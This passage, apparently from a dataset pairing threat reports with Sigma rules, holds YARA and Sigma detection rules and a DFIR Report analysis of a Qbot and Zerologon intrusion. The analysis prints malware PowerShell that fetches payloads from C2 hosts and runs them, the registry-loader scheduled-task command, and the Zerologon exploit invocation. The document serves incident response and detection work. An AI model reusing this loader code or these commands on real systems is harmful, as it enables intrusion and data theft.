https://github.com/SigmaHQ/sigma/blob/940f89d43dbac5b7108610a5bde47cda0d2a643b/rules/windows/registry/registry_set/registry_set_cobaltstrike_service_installs.yml\n- https://github.com/SigmaHQ/sigma/blob/33b370d49bd6aed85bd23827aa16a50bd06d691a/rules/windows/process_creation/proc_creation_win_susp_net_execution.yml\n- https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_schtasks_reg_loader.yml\n- https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_nltest_recon.yml\n- https://github.com/SigmaHQ/sigma/blob/1f8e37351e7c5d89ce7808391edaef34bd8db6c0/rules/windows/process_creation/proc_creation_win_susp_whoami.yml\n\n### Yara\n\n```\n/*\n   YARA Rule Set\n   Author: The DFIR Report\n   Date: 2022-02-20\n   Identifier: Case 8734\n   Reference: https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\n*/\n\n/* Rule Set ----------------------------------------------------------------- */\n\nimport \"pe\"\n\nrule qbot_8734_payload_dll {\n   meta:\n      description = \"files - file e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987\"\n      author = \"The DFIR Report\"\n      reference = \"https://thedfirreport.com\"\n      date = \"2022-02-20\"\n      hash1 = \"e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987\"\n   strings:\n      $s1 = \"Terfrtghygine.dll\" fullword ascii\n      $s2 = \"Winamp can read extended metadata for titles. Choose when this happens:\" fullword wide /* Goodware String - occured 1 times */\n      $s3 = \"Read metadata when file(s) are loaded into Winamp\" fullword wide /* Goodware String - occured 1 times */\n      $s4 = \"Use advanced title formatting when possible\" fullword wide /* Goodware String - occured 1 times */\n      $s5 = \"PQVW=!?\" fullword ascii\n      $s6 = \"Show underscores in titles as spaces\" fullword wide /* Goodware String - occured 1 times */\n      $s7 = \"Advanced title display format :\" fullword wide /* Goodware String - occured 1 times */\n      $s8 = \"CreatePaint\" fullword ascii\n      $s9 = \"PQRVW=2\\\"\" fullword ascii\n      $s10 = \"Advanced Title Formatting\" fullword wide /* Goodware String - occured 1 times */\n      $s11 = \"Read metadata when file(s) are played or viewed in the playlist editor\" fullword wide /* Goodware String - occured 1 times */\n      $s12 = \"Show '%20's in titles as spaces\" fullword wide /* Goodware String - occured 1 times */\n      $s13 = \"Example : \\\"%artist% - %title%\\\"\" fullword wide /* Goodware String - occured 1 times */\n      $s14 = \"PQRVW=g\" fullword ascii\n      $s15 = \"PQRW=e!\" fullword ascii\n      $s16 = \"ATF Help\" fullword wide /* Goodware String - occured 1 times */\n      $s17 = \"(this can be slow if a large number of files are added at once)\" fullword wide /* Goodware String - occured 1 times */\n      $s18 = \"PQRVW=$\" fullword ascii\n      $s19 = \"Metadata Reading\" fullword wide /* Goodware String - occured 1 times */\n      $s20 = \"Other field names: %artist%, %album%, %title%, %track%, %year%, %genre%, %comment%, %filename%, %disc%, %rating%, ...\" fullword wide /* Goodware String - occured 1 times */\n   condition:\n      uint16(0) == 0x5a4d and filesize < 2000KB and\n      ( pe.imphash() == \"aa8a9db10fba890f8ef9edac427eab82\" and pe.exports(\"CreatePaint\") or 8 of them )\n}\n\nrule qbot_dll_8734 {\n   meta:\n      description = \"files - qbot.dll\"\n      author = \"TheDFIRReport\"\n      reference = \"QBOT_DLL\"\n      date = \"2021-12-04\"\n      hash1 = \"4d3b10b338912e7e1cbade226a1e344b2b4aebc1aa2297ce495e27b2b0b5c92b\"\n   strings:\n      $s1 = \"Execute not supported: %sfField '%s' is not the correct type of calculated field to be used in an aggregate, use an internalcalc\" wide\n      $s2 = \"IDAPI32.DLL\" fullword ascii\n      $s3 = \"ResetUsageDataActnExecute\" fullword ascii\n      $s4 = \"idapi32.DLL\" fullword ascii\n      $s5 = \"ShowHintsActnExecute\" fullword ascii\n      $s6 = \"OnExecute@iG\" fullword ascii\n      $s7 = \"OnExecutexnD\" fullword ascii\n      $s8 = \"ShowShortCutsInTipsActnExecute\" fullword ascii\n      $s9 = \"ResetActnExecute \" fullword ascii\n      $s10 = \"RecentlyUsedActnExecute\" fullword ascii\n      $s11 = \"LargeIconsActnExecute\" fullword ascii\n      $s12 = \"ResetActnExecute\" fullword ascii\n      $s13 = \"OnExecute<\" fullword ascii\n      $s14 = \"TLOGINDIALOG\" fullword wide\n      $s15 = \"%s%s:\\\"%s\\\";\" fullword ascii\n      $s16 = \":\\\":&:7:?:C:\\\\:\" fullword ascii /* hex encoded string '|' */\n      $s17 = \"LoginPrompt\" fullword ascii\n      $s18 = \"TLoginDialog\" fullword ascii\n      $s19 = \"OnLogin\" fullword ascii\n      $s20 = \"Database Login\" fullword ascii\n   condition:\n      uint16(0) == 0x5a4d and filesize < 3000KB and\n      8 of the\n```\n\n## MITRE\n\n- Exploitation for Privilege Escalation – T1068\n- Service Execution – T1569.002\n- Network Share Discovery – T1135\n- Pass the Hash – T1550.002\n- PowerShell – T1059.001\n- Windows Command Shell – T1059.003\n- Network Share Discovery – T1135\n- Obfuscated Files or Information – T1027\n- Scheduled Task – T1053.005\n- Process Injection – T1055\n- Remote System Discovery – T1018\n- Obfuscated Files or Information – T1027\n- Domain Trust Discovery – T1482\n- Domain Groups – T1069.002\n- System Owner/User Discovery – T1033\n- Network Share Discovery – T1135\n- Remote Services – T1021\n- Local Account – T1087.001\n- Security Software Discovery – T1518.001\n\n```image\nAlt: MITRE ATT&CK\nDescription: The image is a flowchart detailing the relationships and tactics used in a cyber attack scenario involving Qbot and Zerologon. It is structured according to the MITRE ATT&CK framework, illustrating various tactics and techniques such as initial access, execution, privilege escalation, lateral movement, discovery, command and control, and exfiltration. Each tactic is accompanied by specific techniques and associated tools, such as Cobalt Strike, PowerShell, and others. The flowchart visually organizes these components, highlighting how they connect to lead to a full domain compromise.\nTranscription: |\n  TA0001: Initial Access\n      T1566.001: Phishing: Spearphishing Attachment -> Qbot\n  \n  TA0002: Execution\n      T1059.001: Command and Scripting Interpreter: PowerShell\n      T1059.003: Command and Scripting Interpreter: Windows Command Shell -> Cobalt Strike\n      T1569: System Services\n  \n  TA0004: Privilege Escalation\n      T1078.002: Valid Accounts: Domain Accounts\n      T1086: Exploitation for Privilege Escalation -> Zerologon\n  \n  TA0005: Defense Evasion\n      T1055: Process Injection -> Cobalt Strike\n  \n  TA0003: Persistence\n      T1053.005: Scheduled Task/Job: Scheduled Task\n  \n  TA0008: Lateral Movement\n      T1021.002: Remote Services: SMB/Windows Admin Shares -> Cobalt Strike\n      T1021.001: Remote Services: Remote Desktop Protocol\n  \n  TA0007: Discovery\n      T1518.001: Software Discovery: Security Software Discovery -> wmic\n      T1018: Remote System Discovery -> Ping\n      T1087.002: Account Discovery: Domain Account -> ADFind\n      T1135: Network Share Discovery -> Net View\n      T1069.001: Permission Groups Discovery: Local Groups\n      T1069: Permission Groups Discovery: Domain Groups -> Net Group\n      T1482: Domain Trust Discovery -> Ntest\n  \n  TA0011: Command and Control\n      T1071: Application Layer Protocol -> Cobalt Strike and Qbot\n  \n  TA0010: Exfiltration\n      T1041: Exfiltration over C2 Channel -> Documents from File Share Server and Cobalt Strike\n```",
    "sigma_rule": {
      "title": "Scheduled Task Executing Payload from Registry",
      "id": "86588b36-c6d3-465f-9cee-8f9093e07798",
      "related": [
        {
          "id": "c4eeeeae-89f4-43a7-8b48-8d1bdfa66c78",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the creation of a schtasks that potentially executes a payload stored in the Windows Registry using PowerShell.",
      "references": [
        "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/"
      ],
      "author": "X__Junior (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-07-18",
      "tags": [
        "attack.execution",
        "attack.persistence",
        "attack.t1053.005",
        "attack.t1059.001"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\schtasks.exe"
          },
          {
            "OriginalFileName": "schtasks.exe"
          }
        ],
        "selection_cli_create": {
          "CommandLine|contains": "/Create"
        },
        "selection_cli_get": {
          "CommandLine|contains": [
            "Get-ItemProperty",
            " gp "
          ]
        },
        "selection_cli_hive": {
          "CommandLine|contains": [
            "HKCU:",
            "HKLM:",
            "registry::",
            "HKEY_"
          ]
        },
        "filter_main_encoding": {
          "CommandLine|contains": [
            "FromBase64String",
            "encodedcommand"
          ]
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_schtasks_reg_loader.yml",
    "id": "480"
  },
  {
    "url": "https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/",
    "markdown": "# Qbot and Zerologon Lead To Full Domain Compromise\n\n**Categories:** adfind, cobaltstrike, Qbot\n\n**Published on:** February 21, 2022\n\nIn this intrusion (from November 2021), a threat actor gained its initial foothold in the environment through the use of Qbot (a.k.a. Quakbot/Qakbot) malware.\n\nSoon after execution of the Qbot payload, the malware established C2 connectivity and created persistence on the beachhead. Successful exploitation of the Zerologon vulnerability (CVE-2020-1472) allowed the threat actors to obtain domain admin privileges. This level of access was abused to deploy additional Cobalt Strike beacons and consequently pivot to other sensitive hosts within the network. The threat actor then exfiltrated sensitive documents from the environment before being evicted from the network.\n\n### Summary\n\nThe threat actors gained initial access to a Windows workstation through the execution of a malicious DLL. The first activity of QBot was seen 5 minutes after the DLL was executed. Various automated discovery commands were used to map the network topology, retrieve local group member information, and list available file shares/privileges of the infected user.\n\nFollowing the first discovery stage, Qbot dropped another malicious DLL and created a scheduled task to obtain persistence. The scheduled task’s primary purpose was to execute a (base64-encoded) PowerShell Cobalt Strike beacon every 30 minutes.\n\nOnce the threat actors established persistence, they continued with enumerating the environment by mapping out the Active Directory environment using tools such as `Nltest`, `net`, and `ADFind`.\n\nUpon the identification of one of the domain controllers, the attackers proceeded to exploit the ZeroLogon vulnerability. The executable used bears striking similarity to the one used in a previous case From Zero to Domain Admin based on command line arguments and the overall execution of the exploit. The executable named `cool.exe` resets the domain controller password to an empty string, retrieves the Domain Admin password Hash, and installs a service on the DC to reset the DC password so as to not break Active Directory operations.\n\nThe domain admin hash was then used on the beachhead through an over-pass-the-hash attack. After having domain admin privileges, they proceeded with deploying Cobalt Strike Beacons on a file server and another domain controller, which allowed them to pivot to those servers.\n\nFinally, documents were stolen and exfiltrated through Cobalt Strike encrypted C2 channel (HTTPS). To conclude this case, the threat actors were evicted from the network before they completed any further objectives.\n\n### Services\n\nWe offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as QBot, Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found here.\n\nWe also have artifacts and IOCs available from this case such as memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services.\n\n### Timeline\n\n```image\nAlt: Qbot and Zerologon Lead To Full Domain Compromise\nDescription: The image is a detailed timeline chart illustrating the sequence of events related to Qbot and Zerologon vulnerabilities leading to a full domain compromise. It outlines specific timestamps and activities, such as the execution of Qbot DLL, Cobalt Strike discovery, and various network and service interactions. The chart includes commands and actions taken during the attack, making it a comprehensive reference for understanding the progression of the compromise.\nTranscription: |\n  Qbot and Zerologon Lead To Full Domain Compromise\n  \n  16:31 UTC Initial Qbot DLL execution on Beachhead\n      rundll32.exe C:\\Users\\[REDACTED] e2bc6949442adc97345ac811d345f68a386 2laad3c7ae2740a8fa582987.dll,#1\n  \n  16:37 First Qbot C2 activity and discovery activity\n      net localgroup, net share, net view /all, netstat -nao, rout print, ...\n  \n  16:40 DLL dropped by Qbot\n  \n  16:40 Scheduled task created for persistence\n      base64 encoded PowerShell script executed every 30 minutes\n  \n  16:46 C2 begins - Cobalt Strike\n      5.255.98.144:8888\n      dxabt.com\n  \n  17:00 Cobalt Strike discovery\n      nltest.exe /domain_trusts\n      nltest.exe /all_trusts\n      net group \"domain admins\" /domain\n      net group \"domain controllers\" /domain\n      ping -n 1 DOMAINCONTROLLER\n  \n  17:03 ZeroLogon exploit on the first Domain Controller\n      Password of DC was changed\n      Service was installed on the DC\n  \n  17:10 Cobalt Strike Beacon via service installation on the Domain Controller\n  \n  17:12 ADFind discovery from Beachhead\n      find.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName\n  \n  17:12 Over-Pass-The-Hash performed with DA hash on Beachhead\n  \n  17:15 Cobalt Strike Beacon via service installation on another Domain Controller\n  \n  17:31 Security software discovery + Ping + ADFind on the second Domain Controller\n      cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /Value\n      cmd.exe /C C:\\[REDACTED]\\find.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName > C:\\[REDACTED]\\ce.csv\n      cmd.exe /C ping -n 1 SERVER\n  \n  17:35 UTC Cobalt Strike Beacon via service installation on a file server\n  \n  17:37 UTC RDP connection from BeachHead to Domain Controller and a file server\n  \n  17:56 UTC Alerts triggered from canary document indicating open from Host at IP 91.192.182.[*]165\n```\n\n### Initial Access\n\nThe threat actor gained their initial access through the execution of a malicious DLL. Traditionally Qbot is delivered via email using malicious documents that then downloads the malicious DLL. In this case, however, the execution started directly from the qbot DLL found here.\n\nThe execution chain for this QBot infection can be seen below:\n\n```image\nAlt: Qbot Chain\nDescription: The image depicts a detailed execution chain for a Qbot infection. It outlines the steps taken by the malware, starting with the execution of a malicious DLL via 'rundll32.exe'. It shows the injection process into 'explorer.exe' and subsequent connections to two IP addresses, along with the execution of various discovery commands. The steps are categorized into Execution, Discovery, Defense Evasion, and Command and Control, with a legend indicating the color-coding for each category. The image provides specific command line instructions and paths used during the infection process.\nTranscription: |\n  rundll32.exe C:\\Users\\<redacted>\\Downloads\\e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987.dll, #1\n  \n  1. starts & injects into:\n     - C:\\Windows\\SysWOW64\\explorer.exe\n  \n  2. connects to:\n     - 41.228.22.180:443\n     - 24.229.150.54:995\n  \n  3. Runs discovery commands:\n     - whoami /all\n     - net view /all\n     - netstat -ano\n     - cmd /c set\n     - net share\n     - net localgroup\n     - ipconfig /all\n     - route print\n     - arp -a\n     - nslookup -querytype=ALL -timeout=10 _ldap._tcp.dc._msdcs.<redacted>\n  \n  4. Executes:\n     - regsvr32.exe -s \"C:\\Users\\<redacted>\\AppData\\Roaming\\Microsoft\\Fdopitcu\\qwkrfxkgymyv.dll\"\n     - schtasks.exe /Create /F /TN \"{97F2F70B-10D1-4447-A2F3-9B070C86E261}\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\Pvoeooxf).yzbbvhhdypa)))\" /SC MINUTE /MO 30\n```\n\n### Execution\n\n#### QBot PowerShell analysis\n\nWe analyzed the registry path and associated keys that were queried by the scheduled task `HKCU:\\SOFTWARE\\Pvoeooxf` and discovered that three keys were created containing base64 encoded values. Decoding the values resulted in:\n\n1. Copy of QBot DLL\n2. String of QBot C2 IP-addresses separated by a semicolon.\n3. Obfuscated PowerShell script that is referenced by the scheduled task.\n\n```image\nAlt: PowerShell Script\nDescription: The image displays a screenshot of a Windows Registry Editor window, showcasing three registry entries. Each entry has a value name, value type, and data. The entries appear to contain base64 encoded information, likely related to the QBot malware, as indicated by the context provided. The data represents encoded values that could be associated with the malware's configuration or payloads.\n```\n\nThe PowerShell script (triggered by the scheduled task) starts off a chain of events which is illustrated below:\n\n```image\nAlt: PowerShell Chain\nDescription: The image is a flowchart depicting the execution process of a PowerShell script related to QBot malware. It outlines the steps that occur after the script is triggered by a scheduled task. The flowchart includes key decision points, such as validating the registry key creation date, and actions taken based on whether the date is less than or greater than four hours. It highlights two possible paths: executing a local QBot payload or fetching a remote QBot payload. Each step illustrates commands and processes, such as using 'regsvr32.exe' for DLL execution and 'Start-Process' for executing various types of payloads.\nTranscription: |\n  1. Start PowerShell script via Scheduled task\n     └── 2. Validate registry-key creation date\n         ├── < 4 hours\n         │   └── 3. Execute local Qakbot payload in registry\n         │       └── regsvr32.exe $env:temp/<random>.dll\n         └── > 4 hours\n             └── 3. Fetch remote Qakbot payload\n                 └── https://QbotIP/zk?r=n=kfdopi828182\n                     ├── regsvr32.exe $env:temp/<random>.dl\n                     ├── Start-Process $env:temp/<random>.exe\n                     ├── IEX(payload)\n                     └── cmd /c payload\n                     ├── Start-Process $env:temp/<random>.bat\n                     └── Start-Process $env:temp/<random>.vbs\n```\n\nWhen run for the first time, the script creates a new registry key entry in the same path, saving the date of execution. It then verifies upon execution if the creation date key of this registry key is older than 4 hours.\n\n```image\nAlt: Registry Key\nDescription: The image depicts a section of PowerShell script code. It includes a function named 'EjSok()', which retrieves an item property from a specified registry path. The script checks if the registry entry exists and retrieves the date associated with it. It also contains logic to determine if the current date exceeds a threshold of four hours from the retrieved date. The code highlights operations related to registry manipulation and date comparisons, relevant to the analysis of malware behavior.\nTranscription: |\n  function EjSok() {\n      $XtqpDJ = (Get-ItemProperty -Path $tvDQBlr).$WQudUrNwDr\n      if (! $XtqpDJ) {\n          return 1\n      }\n      $vRONdfU = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($XtqpDJ))\n      $JfKiixa = Get-Date -Date $vRONdfU\n      $JfKiixa = $JfKiixa.AddHours(4)\n      if ((Get-Date) -gt $JfKiixa) {\n      }\n      return 2\n  }\n```\n\nBased on the outcome, it will either: (1) retrieve the base64-encoded Qbot payload from the Windows Registry, decode it, save it on the file system and execute it.\n\n```image\nAlt: Qbot Payload\nDescription: The image displays a snippet of PowerShell code related to the execution of a malicious DLL. The code includes functions and commands for generating random file names, retrieving encoded data from the Windows Registry, decoding it from base64 format, and executing the DLL using 'regsvr32.exe'. This snippet is part of a larger analysis of the QBot malware's behavior and demonstrates the technical details involved in its execution.\nTranscription: |\n  function UQTV()\n  {\n      $MvmmBxnVj0 = Get-Random\n      $RBnYwaG = (Get-ItemProperty -Path $tvDQbLr).$LngwgFRytJ\n      if ($RBnYwaG) {\n          $_f_zhkPw = \"$env:TEMP\\($MvmmBxnVj0)1.dll\"\n          $fPsS = [System.Convert]::FromBase64String($RBnYwaG)\n          [System.IO.File]::WriteAllBytes($_f_zhkPw, $fPsS)\n          Start-Process -FilePath \"regsvr32.exe\" -ArgumentList \"$_f_zhkPw\"\n      }\n  }\n```\n\nOR (2) Fetch the QBot payload remotely using one of the active C2 IPs using the `Invoke-WebRequest` PowerShell module:\n\n```image\nAlt: Invoke-WebRequest\nDescription: The image depicts a snippet of PowerShell code, which is part of a function that initiates a web request to a dynamically constructed URL. The code includes variables for the URL and utilizes the `Invoke-WebRequest` cmdlet to fetch content, with error handling for different response headers. This script is relevant to the analysis of QBot malware, highlighting the method of retrieving payloads via command-and-control (C2) infrastructure.\nTranscription: |\n  function __NOxzyOQT([string]$RGNDm)\n  {\n      $ekanByiPK = \"https://$($RGNDm)$($d_IP)?n=$($PgZYjDK)\"\n      try\n      {\n          $kArvTQZY = Invoke-WebRequest -UseBasicParsing -Uri $ekanByiPK -DisableKeepAlive\n          $zCdUzfmhD = $kArvTQZY.StatusCode\n          if ($kArvTQZY.Headers.'Content-Type') {\n              $JACjQ = $kArvTQZY.Content\n          } else {\n              $JACjQ = [System.Text.Encoding]::ASCII.GetString($kArvTQZY.Content)\n          }\n      }\n  }\n```\n\nThe PS script contains built-in logic to execute various types of payloads including batch and Visual Basic files.\n\n```image\nAlt: Payload Execution\nDescription: The image displays a segment of PowerShell script code, showcasing various commands and functions used for executing payloads associated with the QBot malware. The code includes base64 decoding, file writing operations, and process execution commands, indicating a malware execution chain that retrieves and runs encoded malicious files. Specific variables and methods are highlighted, demonstrating the technical aspects of the malware's functionality.\nTranscription: |\n  switch ($UMMtDg[0])\n  {\n      0 {\n      }\n      1 {\n      }\n      2 {\n          $hHlJSNzeM = \"$env:TEMP\\$( $MwmmBxnVj0).dll\"\n          $ZCeNBLpm = [System.Convert]::FromBase64String($UMMtDg[2])\n          [System.IO.File]::WriteAllBytes($hHlJSNzeM, $ZCeNBLpm)\n          Start-Process -FilePath \"regsvr32.exe\" -ArgumentList \"$($hHlJSNzeM)\"\n      }\n      3 {\n          $hHlJSNzeM = \"$env:TEMP\\$( $MwmmBxnVj0).exe\"\n          $ZCeNBLpm = [System.Convert]::FromBase64String($UMMtDg[2])\n          [System.IO.File]::WriteAllBytes($hHlJSNzeM, $ZCeNBLpm)\n          Start-Process \"$($hHlJSNzeM)\"\n      }\n      4 {\n          $BpLv = IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($UMMtDg[2])))\n      }\n      5 {\n          $geLrhCE = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($UMMtDg[2]))\n          Start-Process cmd.exe \"/c $geLrhCE\"\n      }\n      6 {\n          $hHlJSNzeM = \"$env:TEMP\\$( $MwmmBxnVj0).bat\"\n          $ZCeNBLpm = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($UMMtDg[2]))\n          $ZCeNBLpm | Out-File -Encoding ASCII -FilePath $hHlJSNzeM\n          Start-Process \"$($hHlJSNzeM)\"\n      }\n      7 {\n          $hHlJSNzeM = \"$env:TEMP\\$( $MwmmBxnVj0).vbs\"\n          $ZCeNBLpm = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($UMMtDg[2]))\n          $ZCeNBLpm | Out-File -Encoding ASCII -FilePath $hHlJSNzeM\n          Start-Process \"$($hHlJSNzeM)\"\n      }\n  }\n```\n\nThe encoded QBot DLL that was stored in the registry, was dropped in the directory `%APPDATA%\\Roaming\\Microsoft\\Fdopitcu`. The unsigned DLL, with descriptor `Cancel Autoplay 2` was executed using `regsvr32.exe`.\n\n```image\nAlt: DLL Execution\nDescription: The image displays a Windows security audit log entry with details about a new process creation event. Key information included in the log are the Event Code, Process IDs, and the command line used for executing the 'regsvr32.exe' process. The log details the security and account information of the creator and target subjects, as well as the process information, including the parent process 'explorer.exe' and the specific command executed. This information is relevant for understanding the execution context of the QBot malware.\nTranscription: |\n  LogName: Security\n  EventCode: 4688\n  EventType: 0\n  ComputerName: <redacted>\n  SourceName: Microsoft Windows security auditing.\n  Type: Information\n  RecordNumber: 38489\n  Keywords: Audit Success\n  TaskCategory: Process Creation\n  OpCode: Info\n  Message: A new process has been created.\n  \n  Creator Subject:\n      Security ID: S-1-5-21-853439379-3680187918-914098032-1115\n      Account Name: <redacted>\n      Account Domain:\n      Logon ID: 0x741A48\n  \n  Target Subject:\n      Security ID: S-1-0-0\n      Account Name:\n      Account Domain: -\n      Logon ID: 0x0\n  \n  Process Information:\n      New Process ID: 0x1758\n      New Process Name: C:\\Windows\\SysWOW64\\regsvr32.exe\n      Token Elevation Type: %%1936\n      Mandatory Label:\n      Creator Process ID: 0x1958\n      Creator Process Name: C:\\Windows\\SysWOW64\\explorer.exe\n      Process Command Line: regsvr32.exe -s \"C:\\Users\\<redacted>\\AppData\\Roaming\\Microsoft\\Fdopitcu\\qwkrfxgymv.dll\"\n```\n\nUpon execution of this second-stage DLL, various registry keys were created in `HKCU\\Software\\Microsoft\\Yerqbqokc`. In addition, a new instance of explorer.exe (32-bit) was started and injected into.\n\n```image\nAlt: Registry Keys\nDescription: The image depicts a flowchart illustrating the relationship between various registry keys and processes involved in the execution of a malicious DLL within a cybersecurity context. It shows multiple registry paths under 'HKCU\\\\Software\\\\Microsoft\\\\Yerqbqokc' highlighted in yellow, indicating their relevance to the QBot malware analysis. Additionally, the flowchart connects the `regsvr32.exe` process (with PID 2988) and the `explorer.exe` process (with PID 3916), indicating that `regsvr32.exe` loads a DLL from a specified user directory, which subsequently creates the `explorer.exe` process. The diagram serves to visualize the malware's behavior through registry manipulation and process execution.\nTranscription: |\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\e519a231\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\17737aec\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\d086727f\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\683a151a\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\15325a90\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\ad8e3df5\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\afcf1d89\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\9a50cdc7\n  \n  [1] regsvr32.exe (PID: 2988)\n  [2] explorer.exe (PID: 3916)\n  \n  2656 LOADS\n  852 CREATE PROCESS\n  \n  C:\\Users\\***\\qwrfkxgymyv.dll\n```\n\nThe registry keys contain eight-character long hex strings for which we believe is part of the malware’s encrypted config.\n\n```image\nAlt: Registry Config\nDescription: The image displays a table with several columns related to Windows Registry entries. The columns include 'Value Name,' 'Value Type,' 'Data,' and 'Value Slack.' Each row represents a different registry key, showing various hexadecimal string values encoded in 'Data,' which are presumably linked to malware behavior. The 'Value Type' consistently lists 'RegBinary,' indicating the data is stored in binary form.\nTranscription: |\n  | Value Name | Value Type | Data                                                | Value Slack          |\n  | ---------- | ---------- | --------------------------------------------------- | -------------------- |\n  | sC5d6043   | RegBinary  | 61-06-2A-56-B2-94-BD-EA-F3-67-29-9F-3F-56-EB-17-... | 6F-66                |\n  | d05d20d0   | RegBinary  | 66-5C-5D-D0-3D-87-F6-1F-91-2A-54-33-4C-32-7...      | 00                   |\n  | d2139071   | RegBinary  | 6A-FF-71-4B-8D-8C-F7-3E-6B-11-F0-BD-8B-BA-...       | 00-80-68-46-09-00    |\n  | 6aaff714   | RegBinary  | AF-64-9B-02-05-AD-10-D5-45-28-C9-C5-8C-8...         | 00-53-00-68-00       |\n  | 17a7b89e   | RegBinary  | 26-13-19-3A-7C-1A-7F-24-7E-27-4F-27-...             | 00-00-00             |\n  | af1bdfb    | RegBinary  | 3B-8A-29-64-80-9A-64-80-9A-2D-CE-F8-2A-...          | 00-54-79-70-65-00    |\n  | 9a840fb5   | RegBinary  | 35-AE-8D-F6-9D-ED-47-D4-89-FB-6B-39-F8-...          | 00-18-87-09-00       |\n  | a8b5884b   | RegBinary  | 46-A7-DC-1B-3C-7A-93-7A-2D-7A-3A-...                | 45-00                |\n  | 574a6093   | RegBinary  | 38-4C-32-4C-2E-8C-52-2E-8B-44-18-1C-...             | 24-30-23-39-27-C9-42 |\n  | 45ffc7fd   | RegBinary  | EA-6A-32-4C-4E-2B-4E-2B-44-18-1C-10-D...            | 00-00-00             |\n  | 609490a1   | RegBinary  | 1A-25-2B-51-7F-15-BF-49-AF-39-42-...                | 34                   |\n  | 38f780f7   | RegBinary  | 6E-5B-7F-15-18-F5-1F-49-AF-39-42-...                | 34                   |\n  | 8831a05b   | RegBinary  | A6-9F-61-78-B6-72-0D-20-9A-B3-50-29-E5-EC-1E-BB...  | 34                   |\n```\n\n### Persistence\n\n#### Scheduled Task/Job – Scheduled Task On Beachhead\n\nThe scheduled task created by Qbot was set to run every 30 minutes and executes a base64 encoded payload stored in the Windows Registry.\n\n```\nschtasks.exe /Create /F /TN \"{97F2F70B-10D1-4447-A2F3-9B070C86E261}\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\Pvoeooxf).yzbbvhhdypa))) \" /SC MINUTE /MO 30\n```\n\n```image\nAlt: Scheduled Task\nDescription: The image is a screenshot of a Windows Task Scheduler log entry detailing the registration of a scheduled task. It includes specific fields such as LogName, EventCode, EventType, ComputerName, User, Type, RecordNumber, and a message indicating that a user registered a scheduled task with a unique identifier. This information is relevant to understanding the persistence mechanism utilized by Qbot malware.\nTranscription: |\n  LogName: Microsoft-Windows-TaskScheduler/Operational\n  EventCode: 106\n  EventType: 4\n  ComputerName: <REDACTED>\n  User: NOT_TRANSLATED\n  SidType: 0\n  SourceName: Microsoft-Windows-TaskScheduler\n  Type: Information\n  RecordNumber: 2717\n  Keywords: None\n  TaskCategory: Task registered\n  OpCode: Info\n  Message: User <REDACTED> registered Task Scheduler task \"{97F2F70B-10D1-4447-A2F3-9B070C86E261}\"\n```\n\n```\nLogName: Microsoft-Windows-TaskScheduler/Operational\nEventCode: 106\nMessage: Task scheduler Task Registered\n```\n\n### Privilege Escalation\n\nThirty minutes after gaining initial access, the threat actors ran an executable file on the beachhead to exploit CVE-2020-1472, Zerologon.\n\nThe executable was named “cool.exe”:\n\n```\nC:\\Windows\\system32\\cmd.exe /C cool.exe [DC IP ADDRESS] [DOMAIN NAME] Administrator -c \"taskkill /f /im explorer.exe\"\n```\n\n```image\nAlt: cool.exe\nDescription: |\n  The image is a screenshot of a command-line interface displaying details about a process executed on a Windows system. It includes the\n  - UtcTime: timestamp of the event\n  - ProcessGuid: unique identifier of the process\n  - ProcessId: identifier number of the running process\n  - Image: path to the executable file (cmd.exe)\n  - Description: indicates it is the Windows Command Processor\n  - CommandLine: shows the command used to run the executable, which includes the path to cmd.exe, the execution of 'cool.exe', and a command to terminate explorer.exe.\n  - It also displays placeholders for the Domain Controller IP, Domain name, and Administrator credentials used in the command. This image is relevant to the context, providing technical insights into the process involved in the exploit.\nTranscription: |\n  UtcTime:\n  ProcessGuid: {6634681a-92da-6192-a412-000000000500}\n  ProcessId: 8672\n  Image: C:\\Windows\\SysWOW64\\cmd.exe\n  FileVersion:\n  Description: Windows Command Processor\n  Product: Microsoft® Windows® Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: Cmd.Exe\n  